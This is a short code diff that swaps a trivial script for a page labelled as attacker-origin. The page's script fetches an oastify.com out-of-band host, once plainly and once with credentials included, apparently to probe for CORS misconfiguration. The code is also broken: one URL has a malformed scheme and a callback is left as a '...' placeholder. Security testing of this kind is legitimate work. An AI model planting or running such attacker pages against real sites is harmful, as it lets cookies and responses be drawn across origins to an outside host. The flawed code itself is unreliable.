@@ -1,1 +1,13 @@
-<script>console.log(0)</script>
+<!-- parent page (attacker-origin.com) -->
+<script>
+  // simple GET
+  fetch('https:/9iszmikzzqky1v5c1dtkvrexlorff53u.oastify.com/')
+    .then(r => r.text()).then(t => console.log('got', t))
+    .catch(e => console.error('fetch failed', e));
+
+  // credentialed fetch (cookies) — only works if target permits CORS + credentials
+  fetch('https://9iszmikzzqky1v5c1dtkvrexlorff53u.oastify.com/', {
+    method: 'GET',
+    credentials: 'include'
+  }).then(...);
+</script>
